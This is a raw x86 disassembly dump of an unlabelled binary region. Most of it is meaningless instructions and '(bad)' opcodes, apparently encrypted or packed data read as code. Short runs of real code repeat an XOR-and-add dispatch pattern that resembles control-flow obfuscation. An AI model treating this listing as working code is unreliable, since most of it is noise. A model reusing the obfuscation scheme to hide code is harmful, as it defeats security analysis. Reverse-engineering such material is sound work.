  40198e:	jg     0x401974
  401990:	and    eax,DWORD PTR [esi+edx*2+0x52]
  401994:	rol    BYTE PTR [ebx],0xae
  401997:	add    DWORD PTR [edi+0x28],0x3d9b8e11
  40199e:	(bad)  
  40199f:	mov    esi,0xe7165190
  4019a4:	xchg   edi,eax
  4019a5:	int3   
  4019a6:	mov    edx,0x2b76d658
  4019ab:	push   cs
  4019ac:	scas   al,BYTE PTR es:[edi]
  4019ad:	jecxz  0x401a18
  4019af:	push   edi
  4019b0:	in     al,dx
  4019b1:	pusha  
  4019b2:	and    al,0xb4
  4019b4:	xchg   ebx,eax
  4019b5:	bound  ecx,QWORD PTR [edi*8-0x1e23cca9]
  4019bc:	pop    esi
  4019bd:	imul   edi,DWORD PTR [edx+0x66],0xeccbe9d3
  4019c4:	pop    es
  4019c5:	rol    BYTE PTR [edi+ebx*1],1
  4019c8:	or     eax,0xd454b65c
  4019cd:	ds (bad) 
  4019cf:	xor    DWORD PTR [ebx+edi*1],esi
  4019d2:	mov    es,esp
  4019d4:	je     0x40197a
  4019d6:	or     DWORD PTR [ecx-0x1755da7a],edx
  4019dc:	mov    edi,ebp
  4019de:	loop   0x4019a1
  4019e0:	mov    ecx,0x6b1d0db8
  4019e5:	mov    ebp,0xe0fc0f6f
  4019ea:	popf   
  4019eb:	mov    bl,0xf8
  4019ed:	aaa    
  4019ee:	sti    
  4019ef:	js     0x401a09
  4019f1:	rcr    DWORD PTR [edi-0xa],1
  4019f4:	out    0x26,al
  4019f6:	mov    bl,0x4c
  4019f8:	repz retf 0x66d1
  4019fc:	sbb    esi,DWORD PTR [edx+0x4887cc3b]
  401a02:	fsubr  DWORD PTR [edi+0x8d03f0d]
  401a08:	mov    ebp,0x991c2618
  401a0d:	retf   
  401a0e:	(bad)  
  401a0f:	adc    eax,0x543cf110
  401a14:	aas    
  401a15:	fsub   DWORD PTR [edx+eax*1-0x5f16a3d3]
  401a1c:	daa    
  401a1d:	xor    DWORD PTR [eax-0x58],ecx
  401a20:	xchg   edi,eax
  401a21:	xor    DWORD PTR [eax],ebp
  401a23:	dec    BYTE PTR ds:0x58a768f5
  401a29:	sub    dh,ch
  401a2b:	ds enter 0x7a5e,0x59
  401a30:	outs   dx,BYTE PTR ds:[esi]
  401a31:	pop    esi
  401a32:	xchg   esp,eax
  401a33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a34:	mov    ebx,0xccaeefd0
  401a39:	jge    0x401a95
  401a3b:	test   BYTE PTR [ecx],ch
  401a3d:	sub    DWORD PTR [ebp-0x593f172a],edi
  401a43:	xor    eax,0x76ce4e9d
  401a48:	push   eax
  401a49:	fidivr WORD PTR [ecx+0x1e]
  401a4c:	xchg   dx,bp
  401a4f:	add    al,BYTE PTR [edi+0x6043f60f]
  401a55:	lds    di,DWORD PTR [ebp+0x3]
  401a59:	out    dx,al
  401a5a:	jb     0x401a6f
  401a5c:	(bad)  
  401a5d:	rcr    DWORD PTR ds:0x4e429583,1
  401a63:	sub    DWORD PTR [ecx-0x46],0x18
  401a67:	and    DWORD PTR [ecx],eax
  401a69:	xor    ebx,DWORD PTR [edi-0x3b22b3d]
  401a6f:	inc    esi
  401a70:	in     al,dx
  401a71:	or     ch,BYTE PTR [edi-0x67fa1f47]
  401a77:	mov    DWORD PTR [ebp-0x50],ebx
  401a7a:	jmp    0x401c1b
  401a7f:	xchg   ecx,eax
  401a80:	mov    al,ds:0xe9b3d9b3
  401a85:	push   ecx
  401a86:	jo     0x401aa0
  401a88:	adc    BYTE PTR [esi],bl
  401a8a:	dec    esp
  401a8b:	das    
  401a8c:	jl     0x401a32
  401a8e:	mov    bl,0xe
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401a85
  401a98:	sub    ch,ch
  401a9a:	sbb    DWORD PTR [edi+esi*8-0x14],esp
  401a9e:	bound  eax,QWORD PTR [ebp-0x26]
  401aa1:	xor    eax,0x5e384de2
  401aa6:	lods   al,BYTE PTR ds:[esi]
  401aa7:	(bad)  
  401aa9:	sub    bh,dl
  401aab:	and    al,0xf
  401aad:	sbb    ch,BYTE PTR [esi-0x6b025b28]
  401ab3:	dec    BYTE PTR [ebx+0x53a9556f]
  401ab9:	xchg   ebx,eax
  401aba:	mov    cl,0x99
  401abc:	dec    ebp
  401abd:	mov    DWORD PTR [ebp-0x30],ebp
  401ac0:	std    
  401ac1:	cmc    
  401ac2:	ins    BYTE PTR es:[edi],dx
  401ac3:	cmp    DWORD PTR [edi+0x35],eax
  401ac6:	lahf   
  401ac7:	xlat   BYTE PTR ds:[ebx]
  401ac8:	add    al,0xef
  401aca:	mov    ds:0x85249254,al
  401acf:	cld    
  401ad0:	js     0x401b22
  401ad2:	and    BYTE PTR [edx+0x25792537],cl
  401ad8:	or     ecx,DWORD PTR [ebx-0x2cdd6e23]
  401ade:	pusha  
  401adf:	cmc    
  401ae0:	inc    esi
  401ae1:	lds    edx,FWORD PTR [ebx-0x4060c110]
  401ae7:	push   ss
  401ae8:	idiv   BYTE PTR [esi-0x27f97072]
  401aee:	inc    esi
  401aef:	push   esp
  401af0:	jo     0x401b2d
  401af2:	cmp    al,0x1a
  401af4:	xchg   BYTE PTR [ebx-0x2d78cf37],dh
  401afa:	sbb    esi,DWORD PTR [edx+esi*2]
  401afd:	fmul   DWORD PTR [edi+0x31e7b285]
  401b03:	xor    edx,DWORD PTR [esi+0x638a4cf0]
  401b09:	mov    ds:0x8a7d2747,al
  401b0e:	popf   
  401b0f:	xchg   ecx,eax
  401b10:	or     edi,DWORD PTR [ecx-0x1db5a849]
  401b16:	mov    al,0xe
  401b18:	std    
  401b19:	and    al,0xd0
  401b1b:	sub    BYTE PTR [ebx-0x25],0x57
  401b1f:	(bad)  
  401b20:	imul   eax,DWORD PTR [ecx+0x6d4eb845],0xf7c601dc
  401b2a:	ret    
  401b2b:	or     eax,0x9c2d7066
  401b30:	cmp    esp,DWORD PTR [eax+edx*4+0x6bae483]
  401b37:	loop   0x401b34
  401b39:	dec    eax
  401b3a:	fdivr  st,st(4)
  401b3c:	bound  ebx,QWORD PTR [ecx-0x46]
  401b3f:	xchg   ebp,eax
  401b40:	ret    
  401b41:	sub    ebx,edi
  401b43:	xchg   ecx,eax
  401b44:	jp     0x401ad7
  401b46:	dec    edi
  401b47:	inc    eax
  401b48:	sbb    edx,DWORD PTR [ebx]
  401b4a:	sbb    cl,BYTE PTR [edi-0xd]
  401b4d:	inc    esi
  401b4e:	sbb    DWORD PTR [edi],esp
  401b50:	mov    ebx,0xf07dbd7d
  401b55:	xchg   esp,eax
  401b56:	mov    DWORD PTR [ecx-0x16],esp
  401b59:	dec    ecx
  401b5a:	fadd   DWORD PTR [edi+eiz*4+0xd]
  401b5e:	jl     0x401b2e
  401b60:	add    al,0x7f
  401b62:	mov    dl,0x8b
  401b64:	cdq    
  401b65:	dec    esp
  401b66:	add    ebx,DWORD PTR [eax-0x4d72839b]
  401b6c:	sub    DWORD PTR [edx+0x3d0e9966],eax
  401b72:	pop    eax
  401b73:	call   0x35c3924
  401b78:	(bad)  
  401b79:	out    0x73,al
  401b7b:	pop    esp
  401b7c:	jmp    0x1639:0x4f9da7f0
  401b83:	(bad)  
  401b84:	iret   
  401b85:	inc    esp
  401b86:	pop    esp
  401b87:	dec    ebp
  401b88:	mov    ds:0x9640c158,al
  401b8d:	sub    DWORD PTR [ecx+0x65ab8bfb],ebp
  401b93:	jo     0x401b78
  401b95:	in     al,0xd9
  401b97:	ficom  DWORD PTR [edx+0x75]
  401b9a:	fcmovnbe st,st(1)
  401b9c:	push   es
  401b9d:	jmp    0x401b65
  401b9f:	adc    bh,dl
  401ba1:	pop    ds
  401ba2:	out    0xc5,eax
  401ba4:	jle    0x401c25
  401ba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ba7:	out    0x31,eax
  401ba9:	xor    eax,0x5ae80197
  401bae:	out    0x29,eax
  401bb0:	cmp    ah,BYTE PTR [ebp-0x45]
  401bb3:	in     al,dx
  401bb4:	adc    edx,ebx
  401bb6:	mov    bl,0xc2
  401bb8:	push   esi
  401bb9:	scas   al,BYTE PTR es:[edi]
  401bba:	jge    0x401b46
  401bbc:	mov    edx,0x62121fc5
  401bc1:	add    ah,BYTE PTR [ecx-0x15]
  401bc4:	lods   eax,DWORD PTR ds:[esi]
  401bc5:	(bad)  
  401bc6:	cmp    DWORD PTR ds:0x415cdaa2,ebp
  401bcc:	mov    ah,0x95
  401bce:	push   ds
  401bcf:	mov    edi,0x761eec15
  401bd4:	or     BYTE PTR [ebx+0x6ad7b66f],bh
  401bda:	loopne 0x401bf3
  401bdc:	js     0x401bae
  401bde:	xor    eax,0xfe7317f3
  401be3:	pop    edx
  401be4:	gs retf 0xda68
  401be8:	ds adc ebp,0x69c5660c
  401bef:	adc    eax,0x376e2b1f
  401bf4:	xchg   ebx,eax
  401bf6:	call   FWORD PTR [ebp-0x5de621a4]
  401bfc:	pop    DWORD PTR [eax-0x232a54fb]
  401c02:	sbb    BYTE PTR [ebx-0x2b],cl
  401c05:	sbb    ebp,DWORD PTR [ecx+0x2356f73e]
  401c0b:	mov    ds:0x998007d6,al
  401c10:	into   
  401c11:	push   eax
  401c12:	dec    eax
  401c13:	cmp    ebx,DWORD PTR [ebx]
  401c15:	cmp    DWORD PTR [ebx+eiz*2],edi
  401c18:	loop   0x401bbd
  401c1a:	icebp  
  401c1b:	mov    eax,DWORD PTR [ebp-0x50]
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	and    dh,bl
  401c42:	fisub  DWORD PTR [ecx]
  401c44:	mov    bh,BYTE PTR [ecx+0x7e]
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401c09
  401c4d:	ss sbb eax,esp
  401c50:	nop
  401c51:	out    0x4b,al
  401c53:	add    DWORD PTR [ebx+esi*2],ecx
  401c56:	std    
  401c57:	adc    DWORD PTR ds:0x7ffd4dfc,eax
  401c5d:	push   esi
  401c5e:	in     al,dx
  401c5f:	xchg   ebx,eax
  401c60:	add    ah,cl
  401c62:	mov    al,0x99
  401c64:	lds    edx,FWORD PTR [ebx+0x44bc1d93]
  401c6a:	sbb    eax,0x28c2226f
  401c6f:	xchg   esp,eax
  401c70:	lods   eax,DWORD PTR ds:[esi]
  401c71:	cwde   
  401c72:	xor    eax,0x6c35a7df
  401c77:	mov    ebx,0xde82edb7
  401c7c:	sbb    DWORD PTR [ebx+0x5c5de12],edx
  401c82:	inc    ebp
  401c83:	cli    
  401c84:	clc    
  401c85:	scas   eax,DWORD PTR es:[edi]
  401c86:	pop    edi
  401c87:	jmp    0x34add8e9
  401c8c:	repnz sbb al,0x4
  401c8f:	(bad)  
  401c91:	out    dx,al
  401c92:	(bad)  
  401c93:	xor    DWORD PTR [esi+0x44],ecx
  401c96:	xchg   ecx,eax
  401c97:	(bad)  
  401c98:	es mov gs,ebx
  401c9b:	test   eax,0x5476437b
  401ca0:	or     eax,0xb554f88c
  401ca5:	jbe    0x401c32
  401ca7:	pop    esi
  401ca8:	repnz adc al,0x41
  401cab:	pop    ds
  401cac:	aam    0xd2
  401cae:	inc    ebx
  401caf:	xor    dl,BYTE PTR [edx]
  401cb1:	dec    ecx
  401cb2:	cmc    
  401cb3:	adc    al,0x64
  401cb5:	mov    bh,BYTE PTR [edi]
  401cb7:	ss inc edx
  401cb9:	dec    ebp
  401cba:	stos   DWORD PTR es:[edi],eax
  401cbb:	or     bh,BYTE PTR [ecx+0x57c61cf8]
  401cc1:	fcomp  DWORD PTR ds:0xa08bdf63
  401cc7:	loope  0x401cc5
  401cc9:	rep stos DWORD PTR es:[edi],eax
  401ccb:	sub    BYTE PTR [edx],ah
  401ccd:	(bad)  
  401cce:	cli    
  401ccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cd0:	into   
  401cd1:	jne    0x401d4a
  401cd3:	dec    esp
  401cd4:	std    
  401cd5:	mov    BYTE PTR [eax+0x4af2424e],bh
  401cdb:	sbb    DWORD PTR [esi-0x2],eax
  401cde:	cli    
  401cdf:	daa    
  401ce0:	mov    ebx,0x27734310
  401ce5:	cmp    eax,DWORD PTR [ebx]
  401ce7:	ja     0x401cfa
  401ce9:	popa   
  401cea:	dec    edx
  401ceb:	mov    ah,BYTE PTR [edx]
  401ced:	ret    
  401cee:	lock mov BYTE PTR [eax+0x28f9fe02],0xa6
  401cf6:	outs   dx,DWORD PTR ds:[esi]
  401cf7:	pop    edi
  401cf8:	out    0x7f,al
  401cfa:	ds ins BYTE PTR es:[edi],dx
  401cfc:	out    0x13,al
  401cfe:	mov    BYTE PTR [edi],dh
  401d00:	pop    esi
  401d01:	fstp   DWORD PTR [edx+edi*1+0x78]
  401d05:	xor    eax,DWORD PTR [ebx+0x4e]
  401d08:	push   eax
  401d09:	bound  ebp,QWORD PTR [ecx]
  401d0b:	xlat   BYTE PTR ds:[ebx]
  401d0c:	mov    ds:0xd4728bd5,al
  401d11:	xchg   DWORD PTR [edx+edx*4+0x36248f5c],edx
  401d18:	pop    ecx
  401d19:	or     al,0x0
  401d1b:	imul   ebx,eax,0xffffffc9
  401d1e:	mov    edx,DWORD PTR [ebp-0x3c]
  401d21:	mov    esi,0x76fc7360
  401d26:	call   0xacca33e7
  401d2b:	push   es
  401d2c:	dec    ecx
  401d2d:	std    
  401d2e:	add    ah,bl
  401d30:	add    dh,BYTE PTR [ebx]
  401d32:	push   ds
  401d33:	call   0xf5590337
  401d38:	(bad)  [ecx]
  401d3a:	pushf  
  401d3b:	jns    0x401ce5
  401d3d:	inc    edi
  401d3e:	jle    0x401dbd
  401d40:	adc    BYTE PTR [ebx+0x7fd58ef7],dl
  401d46:	jo     0x401cf0
  401d48:	retf   0x661b
  401d4b:	clc    
  401d4c:	scas   eax,DWORD PTR es:[edi]
  401d4d:	jno    0x401d51
  401d4f:	xor    cl,BYTE PTR [edi+0xc]
  401d52:	mov    al,ds:0x27c03511
  401d57:	xchg   DWORD PTR [esi-0x2f7f24ae],esp
  401d5d:	inc    eax
  401d5e:	cmp    ebp,edi
  401d60:	inc    DWORD PTR [eax-0x1e]
  401d63:	cld    
  401d64:	ret    0xd807
  401d67:	xor    dl,BYTE PTR [ecx+0x78]
  401d6a:	les    ebx,FWORD PTR [ebx-0x6db42e63]
  401d70:	xor    DWORD PTR [ecx+0xc],ecx
  401d73:	pushf  
  401d74:	hlt    
  401d75:	xor    eax,0xff599e62
  401d7a:	stos   DWORD PTR es:[edi],eax
  401d7b:	jmp    0xfdbb:0xf6b42ce8
  401d82:	sbb    DWORD PTR [esi],esi
  401d84:	bound  esp,QWORD PTR [eax]
  401d86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d87:	push   ebp
  401d88:	add    BYTE PTR [ebx+0x1e],bh
  401d8b:	xchg   ecx,eax
  401d8c:	iret   
  401d8d:	pop    eax
  401d8e:	pop    es
  401d8f:	adc    al,0x64
  401d91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d92:	pop    edx
  401d93:	ins    DWORD PTR es:[edi],dx
  401d94:	in     eax,0x8d
  401d96:	push   ds
  401d97:	cld    
  401d98:	stc    
  401d99:	ja     0x401db1
  401d9b:	loop   0x401d62
  401d9d:	popa   
  401d9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d9f:	fcomp  QWORD PTR [ebx-0x67]
  401da2:	xor    DWORD PTR [eax],ebx
  401da4:	pop    esi
  401da5:	out    0xef,al
  401da7:	or     DWORD PTR [ecx],edx
  401da9:	xor    eax,0x7f9d662a
  401dae:	shl    BYTE PTR ss:[edx+0x344d1832],cl
  401db5:	jl     0x401d5a
  401db7:	ret    
  401db8:	daa    
  401db9:	pushf  
  401dba:	and    eax,DWORD PTR ds:0xccfde6bd
  401dc0:	(bad)  
  401dc1:	out    0x74,eax
  401dc3:	stc    
  401dc4:	(bad)
  401dc8:	mov    edi,0x16d5b064
  401dcd:	adc    BYTE PTR [eax-0x41],0x3
  401dd1:	(bad)  
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0x28931cc8],ebp
  401e0d:	fs push ss
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401e47
  401e17:	adc    edx,DWORD PTR [ecx+0x47]
  401e1a:	cmp    edx,0x1
  401e1d:	mov    al,0x20
  401e1f:	sahf   
  401e20:	add    BYTE PTR [esi-0x60],bl
  401e23:	mov    esp,0xc9c592bc
  401e28:	mov    ebp,0x5ea5b2a0
  401e2d:	mov    BYTE PTR [eax-0x1d21de6e],0xb4
  401e34:	mov    esi,0x20da20ff
  401e39:	dec    ebp
  401e3a:	cld    
  401e3b:	dec    edx
  401e3c:	outs   dx,BYTE PTR ds:[esi]
  401e3d:	scas   al,BYTE PTR es:[edi]
  401e3e:	mov    ah,0xa1
  401e40:	les    esi,FWORD PTR [ebx+0x73f94eee]
  401e46:	xor    al,0x2c
  401e48:	pop    DWORD PTR [di]
  401e4b:	add    ch,BYTE PTR [ecx+eax*4+0x32]
  401e4f:	sbb    al,0x94
  401e51:	cmp    BYTE PTR [esi-0x2f],cl
  401e54:	nop
  401e55:	xor    eax,0xc072b14a
  401e5a:	lahf   
  401e5b:	retf   0x9145
  401e5e:	icebp  
  401e5f:	lea    eax,[ebp+0x41]
  401e62:	mov    edx,0xc6c65fcf
  401e67:	in     eax,dx
  401e68:	mov    esi,0x80d09889
  401e6d:	mov    bl,0x20
  401e6f:	mov    ch,0x3
  401e71:	test   eax,0xc868bc39
  401e76:	push   edi
  401e77:	pop    ebp
  401e78:	repnz mov esi,0x492b415c
  401e7e:	dec    eax
  401e7f:	xchg   ebp,eax
  401e80:	cdq    
  401e81:	jmp    0x401e0e
  401e83:	into   
  401e84:	ret    
  401e85:	addr16 pusha 
  401e87:	bound  edi,QWORD PTR [ebx]
  401e89:	repnz fwait
  401e8b:	bound  eax,QWORD PTR [esi+0x42d1f6ac]
  401e91:	stc    
  401e92:	daa    
  401e93:	dec    edi
  401e94:	scas   al,BYTE PTR es:[edi]
  401e95:	ret    
  401e96:	mov    al,ds:0x1b30777
  401e9b:	mov    eax,0x5ab923f5
  401ea0:	mov    al,0x36
  401ea2:	mov    dh,0xfe
  401ea4:	(bad)  
  401ea5:	jg     0x401e9e
  401ea7:	pop    ss
  401ea8:	xor    DWORD PTR [esi],edx
  401eaa:	lds    ecx,FWORD PTR [ebx+0x5136a57a]
  401eb0:	xor    eax,0x40d6c17a
  401eb5:	retf   0xf8c1
  401eb8:	jmp    0x401ece
  401eba:	or     eax,esp
  401ebc:	add    esi,DWORD PTR [ecx]
  401ebe:	adc    ecx,DWORD PTR [esp+eax*4+0x43]
  401ec2:	jp     0x401f28
  401ec4:	cwde   
  401ec5:	dec    BYTE PTR [edi+ecx*8-0x707274e8]
  401ecc:	add    BYTE PTR [edx+0x48],0x5c
  401ed0:	push   eax
  401ed1:	scas   eax,DWORD PTR es:[edi]
  401ed2:	push   cs
  401ed3:	add    edi,DWORD PTR [edi-0x156bed9a]
  401ed9:	mov    al,0x81
  401edb:	mov    ?,WORD PTR [ecx-0x58809fca]
  401ee1:	push   ebp
  401ee2:	mov    esp,0xde0f3f64
  401ee7:	(bad)  
  401ee8:	adc    al,0x8c
  401eea:	push   edx
  401eeb:	cs pushf 
  401eed:	jp     0x401f68
  401eef:	paddb  mm7,QWORD PTR [edi]
  401ef2:	adc    ebp,esi
  401ef4:	jge    0x401e9b
  401ef6:	mov    ebx,0x73d5e48f
  401efb:	cli    
  401efc:	push   0xa64254e6
  401f01:	or     DWORD PTR [ebp-0x393aa13b],esi
  401f07:	fldenv ds:0x95d69d55
  401f0d:	or     ah,bh
  401f0f:	and    eax,0x168f1f7d
  401f14:	es jge 0x401f1e
  401f17:	outs   dx,DWORD PTR ds:[esi]
  401f18:	push   0xbec78fdb
  401f1d:	and    DWORD PTR [ebp+0x47742c5b],edx
  401f23:	(bad)  
  401f24:	cli    
  401f25:	repnz pop ds
  401f27:	ret    
  401f28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f29:	adc    edx,DWORD PTR [ebp-0x281de5f6]
  401f2f:	adc    BYTE PTR [edx-0x1d],bh
  401f32:	sub    al,0x1a
  401f34:	push   eax
  401f35:	pushf  
  401f36:	or     eax,0xb8fba08f
  401f3b:	shl    ebp,0xb3
  401f3e:	test   DWORD PTR [ebp+0x69],ebp
  401f41:	adc    DWORD PTR [esi+0x1d],eax
  401f44:	retf   
  401f45:	adc    ecx,DWORD PTR [edi+ebp*4+0x67f2775c]
  401f4c:	add    BYTE PTR [edi],dh
  401f4e:	(bad)  
  401f4f:	push   esi
  401f50:	popf   
  401f51:	mov    eax,ds:0x20ed2ffc
  401f56:	(bad)  
  401f57:	aam    0x63
  401f59:	jae    0x401f51
  401f5b:	inc    ebx
  401f5c:	push   ss
  401f5d:	sub    eax,0x2c9541ca
  401f62:	pop    ecx
  401f63:	xchg   esp,eax
  401f64:	adc    DWORD PTR [esi],edi
  401f66:	adc    ebp,DWORD PTR [ebp-0x28]
  401f69:	enter  0x1c2c,0xcf
  401f6d:	pusha  
  401f6e:	rcl    ch,1
  401f70:	call   0xb24a8324
  401f75:	mov    edx,ecx
  401f77:	ja     0x401f0f
  401f79:	fs aam 0x29
  401f7c:	xchg   esp,eax
  401f7d:	bound  esi,QWORD PTR [edi]
  401f7f:	data16 arpl cx,bp
  401f82:	pop    ebp
  401f83:	xchg   edx,eax
  401f84:	jge    0x401f08
  401f86:	inc    eax
  401f87:	cmp    DWORD PTR [eax+0x763b4cc9],esp
  401f8d:	mov    edi,ds
  401f8f:	(bad)  
  401f90:	adc    al,0x0
  401f92:	or     al,0xdd
  401f94:	test   al,0xf6
  401f96:	pushf  
  401f97:	daa    
  401f98:	imul   eax,ecx,0xf
  401f9b:	test   BYTE PTR [ebp+0x3],ch
  401f9e:	add    BYTE PTR [eax],al
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0x157e0f25
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401f7c
  401fcc:	hlt    
  401fcd:	jp     0x401fb8
  401fcf:	mov    WORD PTR [edi],gs
  401fd1:	cmp    BYTE PTR [esi],0x27
  401fd4:	adc    BYTE PTR es:[edx-0x77c9bd6b],0x24
  401fdc:	fdiv   DWORD PTR [ebx+0x7cbce5b2]
  401fe2:	lds    esi,FWORD PTR [esi]
  401fe4:	aaa    
  401fe5:	retf   0xa4e3
  401fe8:	rcl    BYTE PTR [edi+0x61],1
  401feb:	mov    cl,0x74
  401fed:	retf   0xcc
  401ff0:	lods   al,BYTE PTR ds:[esi]
  401ff1:	mov    ds:0xb0a5a5d4,al
  401ff6:	shr    esi,1
  401ff8:	jnp    0x401fd3
  401ffa:	xor    al,0xcc
  401ffc:	jns    0x402001
  401ffe:	jmp    0xd6cf:0x702699c6
  402005:	mov    ebp,0xc42f5114
  40200a:	lods   eax,DWORD PTR ds:[esi]
  40200b:	(bad)  
  40200c:	xlat   BYTE PTR ds:[ebx]
  40200d:	imul   BYTE PTR [edi-0x2f63e05b]
  402013:	retf   
  402014:	in     al,0xe3
  402016:	enter  0xc67d,0x7e
  40201a:	loopne 0x40200d
  40201c:	js     0x40202d
  40201e:	aam    0x9c
  402020:	loop   0x40200f
  402022:	test   eax,0x22563b81
  402027:	into   
  402028:	mov    ch,0x99
  40202a:	and    al,0xb0
  40202c:	xchg   DWORD PTR [esi-0x36],edx
  40202f:	loopne 0x402083
  402031:	ror    DWORD PTR [edi+0x6e9aab23],cl
  402037:	mov    edi,0xbf528b65
  40203c:	inc    esp
  40203d:	(bad)  
  40203e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40203f:	(bad)  [edx]
  402041:	xor    eax,0x17992615
  402046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402047:	jmp    0x8787:0x9d142e32
  40204e:	mov    al,0xb8
  402050:	je     0x402034
  402052:	repz sub al,BYTE PTR [ebp+0x36]
  402056:	iret   
  402057:	cmp    ebx,DWORD PTR [esi+0x651c489d]
  40205d:	mov    al,0x34
  40205f:	pop    esp
  402060:	mov    ebp,esi
  402062:	in     al,dx
  402063:	loop   0x40209b
  402065:	out    0xea,eax
  402067:	leave  
  402068:	inc    eax
  402069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40206a:	sub    dl,BYTE PTR [esi]
  40206c:	dec    ecx
  40206d:	dec    edx
  40206e:	pop    ebx
  40206f:	call   0x304d695
  402074:	(bad)  
  402075:	stos   DWORD PTR es:[edi],eax
  402076:	xor    esi,DWORD PTR ds:0xf72609f6
  40207c:	popa   
  40207d:	jmp    0xa6ba:0x7b2bb0c0
  402084:	inc    eax
  402085:	mov    BYTE PTR [ebp+0x7e],bl
  402088:	stos   DWORD PTR es:[edi],eax
  402089:	into   
  40208a:	out    dx,al
  40208b:	push   0xd7a36312
  402090:	les    edi,FWORD PTR [eax]
  402092:	int    0xf1
  402094:	hlt    
  402095:	and    cl,cl
  402097:	jmp    0x40202c
  402099:	adc    eax,0x57ebc5cb
  40209e:	xor    dh,BYTE PTR [eax]
  4020a0:	lods   eax,DWORD PTR ds:[esi]
  4020a1:	test   eax,0x9d117029
  4020a6:	mov    ecx,0xaaec6289
  4020ab:	cli    
  4020ac:	mov    esp,0x4cefb5
  4020b1:	mov    ch,0x18
  4020b3:	outs   dx,DWORD PTR ds:[esi]
  4020b4:	jg     0x402060
  4020b6:	or     ebp,ebp
  4020b8:	cmp    al,0x6d
  4020ba:	push   ds
  4020bb:	pushf  
  4020bc:	jnp    0x4020db
  4020be:	out    0x1,al
  4020c0:	jmp    0x72637241
  4020c5:	loop   0x4020f9
  4020c7:	xchg   esi,eax
  4020c8:	or     ah,0x8a
  4020cb:	std    
  4020cc:	in     al,dx
  4020cd:	adc    eax,0x39ab8320
  4020d2:	das    
  4020d3:	xchg   BYTE PTR [edi+0x618b54ef],ch
  4020d9:	ja     0x402109
  4020db:	test   al,0x64
  4020dd:	imul   DWORD PTR [esi]
  4020df:	nop
  4020e0:	jo     0x4020d6
  4020e2:	fs popf 
  4020e4:	and    BYTE PTR [eax-0x1e],ah
  4020e7:	fwait
  4020e8:	lahf   
  4020e9:	or     edx,DWORD PTR [ebp+0x3c09889b]
  4020ef:	ss dec ebx
  4020f1:	mov    DWORD PTR ss:[edx+0xe],ecx
  4020f5:	jg     0x4020b4
  4020f7:	bound  edx,QWORD PTR [esi-0x75]
  4020fa:	enter  0x52c6,0x67
  4020fe:	mov    eax,ds:0x881d22ae
  402103:	cmp    esi,DWORD PTR [esi-0x5b9bdcbb]
  402109:	mov    gs,WORD PTR [edx-0x26]
  40210c:	sbb    al,0xfa
  40210e:	mov    al,ds:0xed8fb4d7
  402113:	dec    ecx
  402114:	test   eax,0x41ffc493
  402119:	push   edx
  40211a:	mov    esp,0xde4488db
  40211f:	aas    
  402120:	nop
  402121:	clc    
  402122:	pop    edx
  402123:	sub    cl,dl
  402125:	loopne 0x4020d3
  402127:	in     al,dx
  402128:	outs   dx,BYTE PTR ds:[esi]
  402129:	mov    ah,0x58
  40212b:	xor    al,BYTE PTR [ecx-0x636c8c1f]
  402131:	adc    al,0x3f
  402133:	aaa    
  402134:	jae    0x4020d5
  402136:	aad    0xe2
  402138:	repnz fimul WORD PTR [ecx-0x7e]
  40213c:	sub    ch,BYTE PTR [ebx+0x2c412a94]
  402142:	jb     0x4021ac
  402144:	test   DWORD PTR [esi-0x41],edx
  402147:	jp     0x4020f6
  402149:	dec    eax
  40214a:	push   edx
  40214b:	pop    esp
  40214c:	add    al,0x22
  40214e:	es push eax
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
